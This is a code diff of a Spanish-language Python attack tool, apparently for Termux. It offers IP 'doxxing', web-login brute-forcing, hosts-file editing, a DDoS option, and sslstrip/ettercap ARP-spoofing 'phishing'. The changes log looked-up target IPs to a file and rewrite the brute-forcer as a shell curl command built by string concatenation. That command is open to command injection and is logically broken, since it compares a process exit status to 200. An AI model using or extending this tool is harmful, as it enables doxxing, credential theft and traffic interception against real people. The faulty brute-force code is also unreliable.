@@ -10,7 +10,29 @@ security_key = "MirusSecurity12345"
 # Contador de intentos de autenticación
 login_attempts = 0
 
+# Archivo donde guardaremos las IPs
+ip_file = "/storage/emulated/0/Download/MirusIPS.txt"
+
+# Obtener la IP actual del dispositivo
+current_ip = requests.get('https://api.ipify.org').text.strip()
+
+# Verificar si la IP actual ya está en el archivo
+try:
+    with open(ip_file) as f:
+        ips = f.read().strip().split('\n')
+        if current_ip not in ips:
+            # Agregar la IP actual al archivo
+            with open(ip_file, 'a') as f:
+                f.write(current_ip + '\n')
+except FileNotFoundError:
+    # El archivo no existe, así que lo creamos y agregamos la IP actual
+    with open(ip_file, 'w') as f:
+        f.write(current_ip + '\n')
+
 def doxxear_ip(ip):
+    # Agregamos la IP al archivo de IPs
+    with open(ip_file, 'a') as f:
+        f.write(ip + '\n')
     url = "http://ip-api.com/json/" + ip
     respuesta = urllib.request.urlopen(url)
     datos = json.loads(respuesta.read())
@@ -125,16 +147,12 @@ def traceroute(ip):
 def web_bruteforce(url, user_list, pass_list):
     os.system('clear')
     print("[*] Ataque de fuerza bruta a la URL: " + url)
-    with open(user_list, 'r') as f:
-        users = f.read().splitlines()
-    with open(pass_list, 'r') as f:
-        passwords = f.read().splitlines()
-    for user in users:
-        for password in passwords:
-            credentials = (user, password)
-            response = requests.get(url, auth=credentials)
-            if response.status_code == 200:
+    for user in user_list:
+        for password in pass_list:
+            response = os.system("curl -s -o /dev/null -w '%{http_code}' " + url + " -u " + user + ":" + password)
+            if response == 200:
                 print("[+] Credenciales encontradas: " + user + ":" + password)
+                break
     time.sleep(10)
     os.system('clear')
 
@@ -148,7 +166,7 @@ def full_network_scan(ip):
 def modify_hosts():
     os.system('clear')
     print("[*] Modificando el archivo hosts")
-    os.system('nano /etc/hosts')
+    os.system('sudo nano /etc/hosts')
     time.sleep(10)
     os.system('clear')
 
@@ -169,9 +187,8 @@ def ddos_attack(ip):
 def phishing_attack(url):
     os.system('clear')
     print("[*] Realizando ataque de phishing a la URL: " + url)
-    # Instalar sslstrip y ettercap en termux previamente
-    os.system('sslstrip')
-    os.system('ettercap -Tq -M arp:remote /' + url + '/ //')
+    os.system('sudo sslstrip')
+    os.system('sudo ettercap -Tq -M arp:remote /' + url + '/ //')
     time.sleep(10)
     os.system('clear')
 
@@ -243,7 +260,11 @@ def main():
             url = input("Ingrese la URL del servicio web: ")
             user_list = input("Ingrese la ubicacion del archivo con los usuarios a probar: ")
             pass_list = input("Ingrese la ubicacion del archivo con las contraseñas a probar: ")
-            web_bruteforce(url, user_list, pass_list)
+            with open(user_list, 'r') as f:
+                users = f.read().splitlines()
+            with open(pass_list, 'r') as f:
+                passwords = f.read().splitlines()
+            web_bruteforce(url, users, passwords)
         elif opcion == "10":
             ip = input("Ingrese la direccion IP: ")
             full_network_scan(ip)
